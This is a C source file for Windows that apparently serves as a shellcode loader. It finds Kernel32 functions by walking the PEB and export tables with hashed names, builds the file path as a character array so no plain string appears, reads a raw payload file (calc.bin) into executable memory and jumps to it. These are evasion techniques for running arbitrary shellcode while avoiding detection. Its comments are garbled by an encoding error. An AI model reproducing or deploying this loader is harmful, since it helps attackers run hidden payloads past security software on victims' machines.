#include "common.h"

void myMain()
{

    

    HMODULE kHandle = myGetModuleHandle(Hash::Kernel32Hash);

    API_TABLE Api;

    Api.fnCreateFileA= (myCreateFileA)myGetProcAddress(kHandle, Hash::CreateFileAHash);
    Api.fnGetFileSize= (myGetFileSize)myGetProcAddress(kHandle, Hash::GetFileSizeHash);
    Api.fnReadFile= (myReadFile)myGetProcAddress(kHandle, Hash::ReadFileHash);
    Api.fnCloseHandle= (myCloseHandle)myGetProcAddress(kHandle, Hash::CloseHandleHash);
    Api.fnVirtualAlloc= (myVirtualAlloc)myGetProcAddress(kHandle, Hash::VirtualAllocHash);
    Api.fnVirtualFree= (myVirtualFree)myGetProcAddress(kHandle, Hash::VirtualFreeHash);

    char filePath[] = { 'D', ':', '\\', 'c', 'a', 'l', 'c', '.', 'b', 'i', 'n', 0 };

    HANDLE hFile = Api.fnCreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = Api.fnGetFileSize(hFile, NULL);
    void* execMem = Api.fnVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        Api.fnCloseHandle(hFile);
    }
    DWORD bytesRead;
    if (!Api.fnReadFile(hFile, execMem, fileSize, &bytesRead, NULL)) {
        Api.fnCloseHandle(hFile);
        Api.fnVirtualFree(execMem, 0, MEM_RELEASE);
    }
    Api.fnCloseHandle(hFile);

    ((void(*)())execMem)();

    Api.fnVirtualFree(execMem, 0, MEM_RELEASE);

}


PVOID myGetProcAddress(IN HMODULE hModule, DWORD64 dwApiNameHash) {
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == HashStringDjb2A(pFunctionName)) {
            return pFunctionAddress;
        }
    }

    return NULL;
}

HMODULE myGetModuleHandle(IN DWORD dwModuleHash) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)(__readgsqword(0x60));
#else
    PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif 

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pListNode = pListHead->Flink;

    // ����ģ���б�
    while (pListNode != pListHead) {
        // ͨ��ƫ�ƻ�ȡLDR_DATA_TABLE_ENTRY
        PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)
            ((PBYTE)pListNode - 0x10);

        if (HashStringDjb2W(pDte->BaseDllName.Buffer) == dwModuleHash) {
            return (HMODULE)(pDte->DllBase);
        }

        pListNode = pListNode->Flink;  // �ƶ�����һ���ڵ�
    }
    return NULL;
}
